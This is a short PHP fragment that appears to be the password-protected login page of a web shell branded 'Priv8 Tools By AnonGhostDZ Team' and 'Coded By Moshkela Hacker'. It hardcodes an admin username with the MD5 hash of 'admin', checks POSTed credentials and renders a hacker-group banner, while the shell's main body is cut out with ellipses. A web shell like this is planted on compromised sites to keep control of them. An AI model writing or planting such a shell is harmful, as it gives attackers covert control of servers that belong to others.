<?php $username = "admin"; $password = "21232f297a57a5a743894a0e4a801fc3"; $user = $_POST['user']; $pass = $_POST['pass']; $form = "<form method='POST'>
	<img src='http://e.top4top.net/p_433ptq7c1.jpg'  style='position:fixed;width:100%;heigth:100%;top:0;left:0;z-index:-9999;' disabled>
	<center>
	<h1>AnonGhostDZ Team</h1> <br>
...
<title>Priv8 Tools By AnonGhostDZ Team<</title>
<link rel="icon" href="http://icons.iconarchive.com/icons/3xhumed/mega-games-pack-23/128/Devil-May-Cry-3-3-icon.png">
</head>
...
<img src="http://c.top4top.net/p_433e3bc11.png" width="500" height="400" />
<h1> Coded By Moshkela Hacker<br>
                                        
</h1>
<h3>tnx : AnonGhostDZ Team </h3>
